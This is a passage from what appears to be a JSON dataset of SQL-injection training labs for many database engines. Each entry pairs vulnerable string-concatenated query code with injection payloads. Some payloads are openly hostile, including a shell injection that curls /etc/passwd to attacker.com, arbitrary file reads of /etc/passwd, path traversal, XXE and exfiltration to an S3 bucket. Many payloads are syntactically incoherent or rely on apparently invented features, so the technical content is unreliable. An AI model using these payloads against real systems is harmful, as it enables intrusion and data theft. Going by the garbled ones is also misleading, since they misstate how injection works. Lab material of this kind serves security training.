                      "Vulnerability name": "Snowflake External Table Refresh Injection",
                      "srcCode": "ALTER EXTERNAL TABLE ext_tbl REFRESH '\\\\\" + userOptions + \\\\\"'",
                      "payloads": [
                        "') FROM (SELECT * FROM information_schema.tables) x--",
                        "PATTERN='.*.csv') RETURNING *--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Google Cloud Spanner INTERLEAVE IN PARENT",
                      "Lab Description": "A Spanner schema migration tool builds INTERLEAVE IN PARENT clauses with dynamic table names. The parent references are concatenated directly into DDL, allowing injection during table creation.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify interleaved table creation",
                        "Inject through parent table parameter",
                        "Bypass schema validation checks",
                        "Access unauthorized datasets",
                        "Modify table inheritance relationships"
                      ],
                      "Vulnerability name": "Spanner Interleave Injection",
                      "srcCode": "CREATE TABLE child_table INTERLEAVE IN PARENT '\\\\\" + userParent + \\\\\"'",
                      "payloads": [
                        "legit_parent')--SPANNER.IGNORE_INTERLEAVE=1 SELECT * FROM information_schema.tables--",
                        "table1' WHERE 1=0) OR 1=1--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Azure Data Explorer External Table Schema",
                      "Lab Description": "A Kusto cluster creates external tables with dynamic schema definitions. The schema expressions are concatenated directly into .create external table commands, allowing injection during schema inference.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify external table creation",
                        "Inject through schema parameter",
                        "Trigger schema inference",
                        "Bypass type validation",
                        "Modify query results via schema poisoning"
                      ],
                      "Vulnerability name": "Kusto External Schema Injection",
                      "srcCode": ".create external table ext_tbl ('\\\\\" + userSchema + \\\\\"')",
                      "payloads": [
                        "col1:string) FROM (SELECT * FROM .show tables) x--",
                        "col1:dynamic) WITH (FORMAT='JSON') WHERE 1=0 UNION SELECT 1--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Elasticsearch SQL ODBC Driver Connection Strings",
                      "Lab Description": "An application builds Elasticsearch ODBC connection strings with dynamic properties. The property values are concatenated directly into connection attempts, allowing injection during driver initialization.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify ODBC connection points",
                        "Inject through connection properties",
                        "Bypass driver validation",
                        "Access restricted indices",
                        "Exfiltrate data through driver errors"
                      ],
                      "Vulnerability name": "Elasticsearch ODBC Connection Injection",
                      "srcCode": "Driver={Elasticsearch ODBC};Server=\" + userServer + \";UID=\" + userUid + \";PWD=\" + userPwd",
                      "payloads": [
                        "attacker.com;Properties=security=\\\\\\\" + (SELECT * FROM information_schema.tables) + \\\\\\\"--",
                        "legit.com:9200\\\\\\\";UID=admin\\\\\\\";PWD=' OR 1=1--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Apache Druid SQL Identifier Escaping",
                      "Lab Description": "A Druid cluster processes SQL queries with dynamic identifier escaping. The escape sequences are concatenated directly into query planning, allowing injection through crafted identifier patterns.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify dynamic identifier usage",
                        "Inject through escape sequences",
                        "Bypass SQL parser validation",
                        "Access system metadata tables",
                        "Execute native Druid queries"
                      ],
                      "Vulnerability name": "Druid Identifier Escape Injection",
                      "srcCode": "SELECT * FROM \\\"\" + userTable + \"\\\"",
                      "payloads": [
                        "datasource\\\" FROM (SELECT * FROM sys.segments) x--",
                        "legit_table\\\" WHERE __time > 0) UNION SELECT 1,2,3--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in InfluxDB Flux Yield Parameter",
                      "Lab Description": "A monitoring system uses InfluxDB Flux with dynamic yield names. The yield identifiers are concatenated directly into Flux scripts, allowing injection during result processing.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify yield statement usage",
                        "Inject through yield name parameter",
                        "Bypass Flux parser validation",
                        "Modify query results",
                        "Exfiltrate data through yielded output"
                      ],
                      "Vulnerability name": "Flux Yield Injection",
                      "srcCode": "from(bucket:\"metrics\") |> yield(name: \"\" + userYield + \"\")",
                      "payloads": [
                        "result\\\" FROM (SELECT * FROM sql_metrics) x--",
                        "data\\\" WHERE 1=0) UNION SELECT 1--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in TimescaleDB Compression Settings",
                      "Lab Description": "A time-series platform alters TimescaleDB compression with dynamic parameters. The configuration strings are concatenated directly into ALTER TABLE statements, allowing injection during compression operations.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify compression configuration",
                        "Inject through compression parameters",
                        "Trigger compression jobs",
                        "Bypass settings validation",
                        "Access compressed chunk data"
                      ],
                      "Vulnerability name": "Timescale Compression Injection",
                      "srcCode": "ALTER TABLE metrics SET (timescaledb.compress, timescaledb.compress_orderby = \\\\\" + userOrder + \\\\\"')",
                      "payloads": [
                        "time DESC') FROM (SELECT * FROM _timescaledb_catalog.hypertable)--",
                        "col1,col2) WHERE 1=0 UNION SELECT 1,2,3--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in CockroachDB Partial Index Predicates",
                      "Lab Description": "A CockroachDB application creates partial indexes with dynamic WHERE clauses. The predicates are concatenated directly into index creation, allowing persistent injection that affects all queries using the index.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify partial index creation",
                        "Inject through index predicate",
                        "Trigger index usage",
                        "Bypass predicate validation",
                        "Persist malicious logic in schema"
                      ],
                      "Vulnerability name": "Cockroach Partial Index Injection",
                      "srcCode": "CREATE INDEX idx_filtered ON users (email) WHERE \\\\\" + userCondition + \\\\\"'",
                      "payloads": [
                        "1=1) WITH (STORING = (password))--",
                        "is_active) FROM (SELECT * FROM crdb_internal.tables) x--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in DuckDB S3 Endpoint Configuration",
                      "Lab Description": "A data pipeline configures DuckDB's S3 extension with dynamic endpoints. The connection strings are concatenated directly into S3 settings, allowing injection during cloud storage operations.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify S3 configuration points",
                        "Inject through endpoint parameters",
                        "Bypass URL validation",
                        "Modify remote data access",
                        "Exfiltrate credentials"
                      ],
                      "Vulnerability name": "DuckDB S3 Endpoint Injection",
                      "srcCode": "SET s3_endpoint='\" + userEndpoint + \"'; SET s3_access_key_id='\" + userKey + \"'; SET s3_secret_access_key='\" + userSecret + \"'",
                      "payloads": [
                        "attacker.com') FROM (SELECT * FROM duckdb_settings)--",
                        "legit.s3.amazonaws.com'; COPY (SELECT * FROM sqlite_master) TO 's3://exfil/leak'--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Materialized View WITH NO DATA Clause",
                      "Lab Description": "A database creates materialized views with dynamic WITH NO DATA options. The clause expressions are concatenated directly into view creation, allowing injection during initial population.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify materialized view creation",
                        "Inject through WITH NO DATA clause",
                        "Trigger view population",
                        "Bypass data validation",
                        "Modify view contents"
                      ],
                      "Vulnerability name": "Materialized View Data Clause Injection",
                      "srcCode": "CREATE MATERIALIZED VIEW mv AS SELECT * FROM source WITH \\\\\" + userDataOption + \\\\\"'",
                      "payloads": [
                        "NO DATA) FROM (SELECT * FROM pg_matviews) x--",
                        "DATA) WHERE 1=0 UNION SELECT 1,2,3--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in SQL Server Ledger View Options",
                      "Lab Description": "A blockchain application uses SQL Server Ledger with dynamic view parameters. The options are concatenated directly into ledger view creation, allowing injection during cryptographic verification.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify ledger view creation",
                        "Inject through view options",
                        "Trigger ledger verification",
                        "Bypass blockchain validation",
                        "Modify historical records"
                      ],
                      "Vulnerability name": "SQL Ledger View Injection",
                      "srcCode": "CREATE VIEW ledger_view WITH (LEDGER_VIEW = ON, '\\\\\" + userOptions + \\\\\"') AS SELECT * FROM table",
                      "payloads": [
                        "VERIFICATION = ON) FROM (SELECT * FROM sys.database_principals) x--",
                        "TRANSACTION_ID_COLUMN = id) WHERE 1=0 UNION SELECT 1--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Google BigQuery Wildcard Table Patterns",
                      "Lab Description": "A data analytics tool uses BigQuery wildcard tables with dynamic patterns. The table patterns are concatenated directly into FROM clauses, allowing injection through crafted glob expressions.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify wildcard table usage",
                        "Inject through table pattern",
                        "Bypass pattern validation",
                        "Access unauthorized datasets",
                        "Exfiltrate data via table expansion"
                      ],
                      "Vulnerability name": "BigQuery Wildcard Injection",
                      "srcCode": "SELECT * FROM `project.dataset.\\\\\" + userPattern + \\\\\"`",
                      "payloads": [
                        "table_*` FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA) x--",
                        "legit_table` WHERE _TABLE_SUFFIX = '') UNION SELECT 1,2,3--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Snowflake Session Parameter Defaults",
                      "Lab Description": "A Snowflake configuration tool sets session parameters with dynamic defaults. The default expressions are concatenated directly into ALTER SESSION statements, allowing injection during session initialization.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify session parameter settings",
                        "Inject through default value expressions",
                        "Trigger new session creation",
                        "Bypass parameter validation",
                        "Persist settings across queries"
                      ],
                      "Vulnerability name": "Snowflake Session Default Injection",
                      "srcCode": "ALTER SESSION SET '\\\\\" + userParam + \\\\\"' = '\\\\\" + userValue + \\\\\"'",
                      "payloads": [
                        "TIMESTAMP_OUTPUT_FORMAT', 'YYYY-MM-DD HH24:MI:SS') FROM (SELECT * FROM information_schema.tables) x--",
                        "QUERY_TAG', 'test'); SELECT * FROM account_usage.access_history--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Databricks SQL Warehouse Configurations",
                      "Lab Description": "A Databricks environment configures SQL warehouses with dynamic parameters. The configuration strings are concatenated directly into warehouse creation, allowing injection during cluster startup.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify warehouse creation endpoints",
                        "Inject through config parameters",
                        "Trigger warehouse startup",
                        "Bypass config validation",
                        "Access metastore via driver nodes"
                      ],
                      "Vulnerability name": "Databricks Warehouse Config Injection",
                      "srcCode": "CREATE WAREHOUSE my_warehouse WITH '\\\\\" + userConfig + \\\\\"'",
                      "payloads": [
                        "AUTO_STOP = 1200) FROM (SELECT * FROM system.metastore.tables) x--",
                        "CLUSTER_SIZE = 'Small'); SELECT * FROM hive_metastore.default.secrets--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Trino Catalog Function Namespaces",
                      "Lab Description": "A Trino cluster creates catalog functions with dynamic namespaces. The namespace paths are concatenated directly into function registration, allowing injection during UDF execution.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify function creation endpoints",
                        "Inject through namespace parameters",
                        "Trigger function execution",
                        "Bypass namespace validation",
                        "Access system functions"
                      ],
                      "Vulnerability name": "Trino Function Namespace Injection",
                      "srcCode": "CREATE FUNCTION '\\\\\" + userNamespace + \\\\\".my_func AS '\\\\\" + userLogic + \\\\\"'",
                      "payloads": [
                        "system', 'return 1') FROM (SELECT * FROM system.metadata.catalogs) x--",
                        "pg_catalog', 'SELECT * FROM pg_user')--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in Presto Table Function Parameters",
                      "Lab Description": "A Presto cluster uses table functions with dynamic arguments. The parameter strings are concatenated directly into function calls, allowing injection during table generation.",
                      "Difficulty Level": "Hard",
                      "Solution Steps": [
                        "Identify table function usage",
                        "Inject through function parameters",
                        "Bypass argument validation",
                        "Modify generated table contents",
                        "Access system tables via function errors"
                      ],
                      "Vulnerability name": "Presto Table Function Injection",
                      "srcCode": "SELECT * FROM TABLE(system.query(query => '\\\\\" + userQuery + \\\\\"'))",
                      "payloads": [
                        "SELECT 1')) FROM (SELECT * FROM system.runtime.nodes) x--",
                        "SELECT * FROM tpch.sf1.customer')) WHERE 1=0 UNION SELECT 1,2,3--"
                      ]
                    },
                    {
                      "Lab scenario": "SQL Injection in ClickHouse Dictionary Source URLs",
                      "Lab Description": "A ClickHouse cluster configures external dictionaries with dynamic source URLs. The URLs are concatenated directly into dictionary definitions, allowing injection during dictionary loading.",
                      "Difficulty Level": "Medium",
                      "Solution Steps": [
                        "Identify dictionary creation",
                        "Inject through source URL parameters",
                        "Trigger dictionary reload",
                        "Bypass URL validation",
                        "Modify dictionary contents"
                      ],
                      "Vulnerability name": "ClickHouse Dictionary URL Injection",
                      "srcCode": "CREATE DICTIONARY my_dict (SOURCE(HTTP(URL '\\\\\" + userUrl + \\\\\"')))",
                      "payloads": [
                        "http://attacker.com/payload')) FROM (SELECT * FROM system.dictionaries) x--",
                        "https://legit.com/data.json')) WHERE 1=0 UNION SELECT 1--"
                      ]
                    },
                    
                    {
                          "Lab scenario": "SQL Injection in PostgreSQL NOTIFY Channel Payload",
                          "Lab Description": "A real-time alert system uses PostgreSQL's NOTIFY command with unsanitized channel payloads. Attackers can inject SQL through crafted notification messages that execute when clients LISTEN to the channel, bypassing typical query defenses.",
                          "Difficulty Level": "Hard",
                          "Solution Steps": [
                            "Identify NOTIFY command usage",
                            "Craft malicious payload in channel message",
                            "Trigger notification event",
                            "Bypass payload length restrictions",
                            "Exfiltrate data through notification responses"
                          ],
                          "Vulnerability name": "PostgreSQL NOTIFY Injection",
                          "srcCode": "SELECT pg_notify('alerts', '\\'' + userMessage + '\\'');",
                          "payloads": [
                            "' || (SELECT version()) || '",
                            "test' FROM (SELECT * FROM pg_user) x--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in MySQL GROUP_CONCAT Separator",
                          "Lab Description": "A reporting dashboard dynamically sets GROUP_CONCAT separators with user input. The separator string is concatenated directly into queries, allowing injection during result aggregation.",
                          "Difficulty Level": "Medium",
                          "Solution Steps": [
                            "Identify GROUP_CONCAT usage",
                            "Inject through separator parameter",
                            "Bypass string truncation defenses",
                            "Leak data via concatenated results",
                            "Chain multiple value exfiltration"
                          ],
                          "Vulnerability name": "MySQL Separator Injection",
                          "srcCode": "SELECT GROUP_CONCAT(username SEPARATOR '\\'' + userSeparator + '\\'') FROM users",
                          "payloads": [
                            "' FROM (SELECT password FROM users) x--",
                            "\\n') UNION SELECT table_name FROM information_schema.tables--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in SQL Server STRING_AGG Delimiter",
                          "Lab Description": "A data export feature uses STRING_AGG with dynamic delimiters. The unsanitized delimiter parameter allows breaking out of string context into SQL execution.",
                          "Difficulty Level": "Medium",
                          "Solution Steps": [
                            "Locate STRING_AGG function calls",
                            "Inject through delimiter parameter",
                            "Bypass NVARCHAR conversion",
                            "Execute stacked queries",
                            "Export data via manipulated CSVs"
                          ],
                          "Vulnerability name": "SQL Server Delimiter Injection",
                          "srcCode": "SELECT STRING_AGG(product_name, '\\'' + userDelimiter + '\\'') FROM products",
                          "payloads": [
                            "') FROM (SELECT * FROM sys.sql_logins)--",
                            "'\\t') UNION SELECT name FROM sys.databases--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in Oracle LISTAGG Delimiter Clause",
                          "Lab Description": "An Oracle APEX application builds LISTAGG queries with user-controlled delimiters. The delimiter clause is concatenated directly into analytic function execution.",
                          "Difficulty Level": "Hard",
                          "Solution Steps": [
                            "Identify LISTAGG usage in reports",
                            "Break delimiter context with charset escaping",
                            "Execute DBMS_LOCK functions",
                            "Bypass ORA-01489 protection",
                            "Exfiltrate via utl_http requests"
                          ],
                          "Vulnerability name": "Oracle LISTAGG Injection",
                          "srcCode": "SELECT LISTAGG(username, '\\'' + userDelimiter + '\\'') WITHIN GROUP (ORDER BY 1) FROM employees",
                          "payloads": [
                            "'||CHR(58)||(SELECT table_name FROM all_tables WHERE rownum=1)--",
                            "'') FROM (SELECT * FROM v$version) WHERE ROWNUM=1--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in Snowflake ARRAY_TO_STRING Delimiter",
                          "Lab Description": "A Snowflake data pipeline uses ARRAY_TO_STRING with dynamic delimiters. The delimiter parameter is embedded directly into JavaScript UDFs, allowing injection during array serialization.",
                          "Difficulty Level": "Medium",
                          "Solution Steps": [
                            "Locate ARRAY_TO_STRING calls",
                            "Inject through delimiter parameter",
                            "Bypass JavaScript sandboxing",
                            "Access account usage views",
                            "Exfiltrate via external stages"
                          ],
                          "Vulnerability name": "Snowflake Array Serialization Injection",
                          "srcCode": "SELECT ARRAY_TO_STRING(ARRAY_CONSTRUCT('a','b'), '\\'' + userDelimiter + '\\'')",
                          "payloads": [
                            "')::STRING FROM (SELECT * FROM information_schema.tables)--",
                            "' || (SELECT current_warehouse()))--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in BigQuery FORMAT() Pattern",
                          "Lab Description": "A BigQuery ML model uses FORMAT() with dynamic format patterns. The format string is concatenated directly into query execution, allowing injection during type conversion.",
                          "Difficulty Level": "Hard",
                          "Solution Steps": [
                            "Identify FORMAT() function usage",
                            "Inject through format specifiers",
                            "Bypass parameter validation",
                            "Access region-specific datasets",
                            "Leak data through CAST errors"
                          ],
                          "Vulnerability name": "BigQuery Format String Injection",
                          "srcCode": "SELECT FORMAT('The result is: %s', '\\'' + userPattern + '\\'')",
                          "payloads": [
                            "%T' FROM (SELECT * FROM `region-us`.INFORMATION_SCHEMA.TABLES)--",
                            "%d') UNION SELECT 1,2,3--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in Azure Synapse OPENJSON Path",
                          "Lab Description": "A Synapse pipeline processes JSON data with dynamic path expressions. The JSON path is concatenated directly into OPENJSON calls, allowing injection during document parsing.",
                          "Difficulty Level": "Medium",
                          "Solution Steps": [
                            "Locate OPENJSON usage",
                            "Inject through JSON path parameters",
                            "Bypass lax/strict mode validation",
                            "Access linked storage accounts",
                            "Exfiltrate via external tables"
                          ],
                          "Vulnerability name": "Synapse JSON Path Injection",
                          "srcCode": "SELECT * FROM OPENJSON(@json, '\\'' + userPath + '\\'')",
                          "payloads": [
                            "$.user') FROM (SELECT * FROM sys.dm_pdw_exec_requests)--",
                            "lax $[*]?(@.id == 1)) WITH (data NVARCHAR(MAX) AS JSON)--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in Databricks JSON_TUPLE Function",
                          "Lab Description": "A Databricks notebook processes JSON records with dynamic field names. The field path is concatenated directly into JSON_TUPLE calls, allowing injection during struct extraction.",
                          "Difficulty Level": "Hard",
                          "Solution Steps": [
                            "Identify JSON_TUPLE usage",
                            "Inject through field name parameters",
                            "Bypass Spark SQL parser",
                            "Access metastore tables",
                            "Exfiltrate via DBFS paths"
                          ],
                          "Vulnerability name": "Databricks JSON Field Injection",
                          "srcCode": "SELECT JSON_TUPLE(json_col, '\\'' + userField + '\\'') FROM events",
                          "payloads": [
                            "user_id') FROM (SELECT * FROM spark_catalog.default.tables)--",
                            "email') WHERE 1=0 UNION SELECT 1,2--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in Redshift JSON_EXTRACT_PATH_TEXT Path",
                          "Lab Description": "A Redshift analytics dashboard builds JSON path queries with user input. The path parameter is concatenated directly into JSON extraction functions.",
                          "Difficulty Level": "Medium",
                          "Solution Steps": [
                            "Locate JSON_EXTRACT_PATH_TEXT calls",
                            "Inject through path expressions",
                            "Bypass SUPER type validation",
                            "Access SVV_TABLE_INFO",
                            "Exfiltrate via UNLOAD commands"
                          ],
                          "Vulnerability name": "Redshift JSON Path Injection",
                          "srcCode": "SELECT JSON_EXTRACT_PATH_TEXT(json_col, '\\'' + userPath + '\\'') FROM semi_structured",
                          "payloads": [
                            "key') FROM (SELECT * FROM svv_external_tables) x--",
                            "array[0]') WHERE 1=0 UNION SELECT 1,2,3--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in Snowflake PARSE_JSON Path",
                          "Lab Description": "A Snowflake data transformation uses PARSE_JSON with dynamic path expressions. The path is concatenated directly into JSON parsing logic.",
                          "Difficulty Level": "Hard",
                          "Solution Steps": [
                            "Identify PARSE_JSON usage",
                            "Inject through path traversal",
                            "Bypass VARIANT type constraints",
                            "Access account usage views",
                            "Exfiltrate via internal stages"
                          ],
                          "Vulnerability name": "Snowflake JSON Parse Injection",
                          "srcCode": "SELECT PARSE_JSON('\\'' + userJson + '\\''):'\\'' + userPath + '\\''",
                          "payloads": [
                            "{\"a\":1}')::VARCHAR FROM (SELECT * FROM information_schema.tables)--",
                            "legit') WHERE 1=0 UNION SELECT OBJECT_CONSTRUCT('key', SYSTEM$WHITELIST())--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in CockroachDB SHOW RANGES Table Pattern",
                          "Lab Description": "A CockroachDB monitoring tool uses SHOW RANGES with dynamic table patterns. The pattern is concatenated directly into range metadata queries.",
                          "Difficulty Level": "Medium",
                          "Solution Steps": [
                            "Identify SHOW RANGES usage",
                            "Inject through table pattern",
                            "Bypass identifier quoting",
                            "Access crdb_internal tables",
                            "Exfiltrate via changefeeds"
                          ],
                          "Vulnerability name": "CockroachDB Range Metadata Injection",
                          "srcCode": "SHOW RANGES FROM TABLE '\\'' + userTable + '\\''",
                          "payloads": [
                            "users') FROM (SELECT * FROM crdb_internal.tables)--",
                            "legit') WHERE 1=0 UNION SELECT 1,2,3--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in DuckDB READ_CSV Auto-Detect Parameter",
                          "Lab Description": "A DuckDB data loader uses READ_CSV with dynamic type detection parameters. The auto-detection clause is concatenated directly into file parsing logic.",
                          "Difficulty Level": "Hard",
                          "Solution Steps": [
                            "Locate READ_CSV calls",
                            "Inject through auto_detect parameters",
                            "Bypass file header validation",
                            "Access system tables",
                            "Exfiltrate via HTTPFS"
                          ],
                          "Vulnerability name": "DuckDB CSV Parsing Injection",
                          "srcCode": "SELECT * FROM READ_CSV('input.csv', auto_detect = '\\'' + userDetect + '\\'')",
                          "payloads": [
                            "true') FROM (SELECT * FROM duckdb_tables())--",
                            "false') WHERE 1=0 UNION SELECT * FROM duckdb_columns()--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in Materialize TAIL Timestamp",
                          "Lab Description": "A Materialize streaming pipeline uses TAIL with dynamic timestamp filters. The timestamp expression is concatenated directly into change data capture queries.",
                          "Difficulty Level": "Medium",
                          "Solution Steps": [
                            "Identify TAIL command usage",
                            "Inject through timestamp parameter",
                            "Bypass MZ_TIMESTAMP validation",
                            "Access internal sources",
                            "Exfiltrate via sinks"
                          ],
                          "Vulnerability name": "Materialize CDC Injection",
                          "srcCode": "TAIL source WITH (SNAPSHOT = '\\'' + userTs + '\\'')",
                          "payloads": [
                            "2023-01-01') FROM (SELECT * FROM mz_catalog.mz_tables)--",
                            "now()') WHERE 1=0 UNION SELECT 1,2,3--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in SingleStore Columnstore Segment Filter",
                          "Lab Description": "A SingleStore analytics platform builds columnstore segment filters with user input. The filter expressions are concatenated directly into segment pruning logic.",
                          "Difficulty Level": "Hard",
                          "Solution Steps": [
                            "Identify columnstore queries",
                            "Inject through segment filters",
                            "Bypass vectorized execution",
                            "Access memsql system tables",
                            "Exfiltrate via leaf nodes"
                          ],
                          "Vulnerability name": "SingleStore Segment Injection",
                          "srcCode": "SELECT * FROM table WHERE columnstore_filter('\\'' + userFilter + '\\'')",
                          "payloads": [
                            "id=1') FROM (SELECT * FROM information_schema.tables)--",
                            "value>0') UNION SELECT * FROM sys.nodes--"
                          ]
                        },
                        {
                          "Lab scenario": "SQL Injection in YugabyteDB YSQL EXPLAIN Format",
                          "Lab Description": "A YugabyteDB performance tool uses EXPLAIN with dynamic format parameters. The format string is concatenated directly into query plan generation.",
                          "Difficulty Level": "Medium",
                          "Solution Steps": [
                            "Locate EXPLAIN ANALYZE calls",
                            "Inject through format parameter",
                            "Bypass JSON output validation",
                            "Access pg_catalog tables",
                            "Exfiltrate via yb_servers()"
                          ],
                          "Vulnerability name": "Yugabyte Explain Injection",
                          "srcCode": "EXPLAIN (FORMAT '\\'' + userFormat + '\\'') SELECT * FROM table",
                          "payloads": [
                            "json') FROM (SELECT * FROM pg_stat_activity)--",
                            "text') UNION SELECT 1,2,3--"
                          ]
                        },


                         {
                              "Lab scenario": "SQL Injection in PostgreSQL COPY TO PROGRAM",
                              "Lab Description": "A data export feature uses PostgreSQL's COPY TO PROGRAM command with dynamic filenames. The program argument is concatenated directly into the command, allowing command injection through crafted filenames.",
                              "Difficulty Level": "Critical",
                              "Solution Steps": [
                                "Identify COPY TO PROGRAM usage",
                                "Inject shell commands through filename",
                                "Bypass path validation",
                                "Execute system commands",
                                "Exfiltrate data via reverse shell"
                              ],
                              "Vulnerability name": "PostgreSQL COPY Command Injection",
                              "srcCode": "COPY (SELECT * FROM sensitive_data) TO PROGRAM 'cp /tmp/\" + userFilename + \"'",
                              "payloads": [
                                "data.csv; curl http://attacker.com/$(cat /etc/passwd)",
                                "legit.csv' || (SELECT pg_read_file('/etc/passwd'))--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in MySQL LOAD DATA LOCAL INFILE",
                              "Lab Description": "A data import tool uses LOAD DATA LOCAL INFILE with dynamic path parameters. The path is concatenated directly into the statement, allowing file system access through path traversal.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify LOAD DATA usage",
                                "Inject path traversal sequences",
                                "Bypass file permission checks",
                                "Read arbitrary files",
                                "Exfiltrate via DNS lookups"
                              ],
                              "Vulnerability name": "MySQL Local File Injection",
                              "srcCode": "LOAD DATA LOCAL INFILE '\" + userFilePath + \"' INTO TABLE temp_data",
                              "payloads": [
                                "../../../../etc/passwd",
                                "legit.csv' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in SQL Server BULK INSERT FORMATFILE",
                              "Lab Description": "A data migration system uses BULK INSERT with dynamic format files. The format file path is concatenated directly into the command, allowing arbitrary file reads through XML external entities.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify BULK INSERT operations",
                                "Inject malicious format file path",
                                "Exploit XML external entities",
                                "Read system files",
                                "Exfiltrate via error messages"
                              ],
                              "Vulnerability name": "SQL Server BULK INSERT XXE",
                              "srcCode": "BULK INSERT customers FROM '\" + userDataFile + \"' WITH (FORMATFILE = '\" + userFormatFile + \"')",
                              "payloads": [
                                "C:\\data.xml', 'C:\\malicious.fmt')--",
                                "legit.csv', 'format.xml<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">']>"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Oracle UTL_FILE File Operations",
                              "Lab Description": "A document management system uses UTL_FILE with dynamic paths. The directory object and filename parameters are concatenated directly into procedure calls, allowing file system access.",
                              "Difficulty Level": "Critical",
                              "Solution Steps": [
                                "Identify UTL_FILE usage",
                                "Inject path traversal sequences",
                                "Bypass directory object restrictions",
                                "Read/write arbitrary files",
                                "Execute system commands via log poisoning"
                              ],
                              "Vulnerability name": "Oracle UTL_FILE Injection",
                              "srcCode": "fhandle := UTL_FILE.FOPEN('\" + userDirectory + \"', '\" + userFilename + \"', 'R');",
                              "payloads": [
                                "DATA_PUMP_DIR', '../../etc/passwd')--",
                                "VALID_DIR', 'legit.log' || CHR(58) || (SELECT table_name FROM all_tables WHERE rownum=1))--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Snowflake External Function HTTP Headers",
                              "Lab Description": "A Snowflake external function passes HTTP headers directly into SQL context. The header values are concatenated into metadata queries without sanitization, allowing injection through crafted API requests.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify external function calls",
                                "Modify request headers",
                                "Bypass header validation",
                                "Execute arbitrary SQL",
                                "Exfiltrate data through function responses"
                              ],
                              "Vulnerability name": "Snowflake Header Injection",
                              "srcCode": "CREATE EXTERNAL FUNCTION api_call(param STRING) RETURNS STRING HEADERS = {'X-User-Id': '\" + userId + \"'} API_INTEGRATION = api_int AS 'https://api.example.com/endpoint'",
                              "payloads": [
                                "' FROM (SELECT * FROM information_schema.tables)--",
                                "1'); SELECT SYSTEM$WHITELIST()--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in BigQuery Scripting Variable Declarations",
                              "Lab Description": "A BigQuery script uses dynamic variable declarations with user input. The variable values are concatenated directly into DECLARE statements, allowing injection during script initialization.",
                              "Difficulty Level": "Medium",
                              "Solution Steps": [
                                "Identify script variable declarations",
                                "Inject through variable assignment",
                                "Bypass type validation",
                                "Execute multiple statements",
                                "Access cross-project datasets"
                              ],
                              "Vulnerability name": "BigQuery Script Variable Injection",
                              "srcCode": "DECLARE filter STRING DEFAULT '\" + userInput + \"';",
                              "payloads": [
                                "' OR 1=1--",
                                "test' UNION SELECT dataset_id FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA--"
                              ]
                            },
                            {
                              "Lab scenario": "SQL Injection in Azure Synapse CETAS External Location",
                              "Lab Description": "A Synapse pipeline creates external tables with dynamic storage locations. The location path is concatenated directly into CETAS statements, allowing injection during table creation.",
                              "Difficulty Level": "High",
                              "Solution Steps": [
                                "Identify CETAS statement usage",
                                "Inject through location parameter",
                                "Bypass storage account validation",
                                "Modify exported data",
                                "Exfiltrate via path manipulation"
                              ],
                              "Vulnerability name": "Synapse CETAS Location Injection",
                              "srcCode": "CREATE EXTERNAL TABLE ext_data WITH (LOCATION = '\" + userLocation + \"') AS SELECT * FROM source",
                              "payloads": [
                                "wasbs://container@storage.blob.core.windows.net/path') WITH (FORMAT='PARQUET') UNION SELECT * FROM sys.sql_logins--",
                                "/tmp/legit') FROM (SELECT * FROM sys.dm_pdw_exec_requests) x--"
                              ]
                            },
                            {
